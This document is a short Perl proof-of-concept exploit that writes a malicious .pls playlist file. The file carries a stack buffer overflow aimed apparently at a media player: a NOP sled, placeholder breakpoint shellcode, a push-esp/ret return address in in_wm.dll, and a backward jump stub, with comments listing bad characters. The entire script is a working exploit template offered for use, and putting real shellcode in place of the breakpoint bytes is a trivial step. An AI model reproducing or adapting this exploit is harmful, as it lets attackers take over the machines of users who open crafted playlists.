#!/usr/bin/perl -w

$start= "[playlist]\r\nFile1=\\\\";

# badchars for $nop & $shellcode: \x00\x0a\x0d\x2e\x5c
# Origin length of $nop ="\x90" x 856;

$nop="\x90" x 856;
$shellcode = "\xcc" x 166;

# badchars for \x83 part: \x00 to \x7F
# 0x66606953 : push esp # ret [in_wm.dll]
# jump 148 bytes backward
# 0:  83 ec 4a                sub    esp, 0x4a
# 3:  83 ec 4a                sub    esp, 0x4a
# 6:  ff e4                   jmp    esp 

$jmp="\x53\x69\x60\x66"."\x83\xec\x4a\x83\xec\x4a\xff\xe4"."\x90\x90\x90\x90";
$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";
open (MYFILE, '>poc.pls');
print MYFILE $start;
print MYFILE $nop;
print MYFILE $shellcode;
print MYFILE $jmp;
print MYFILE $end;
close (MYFILE);

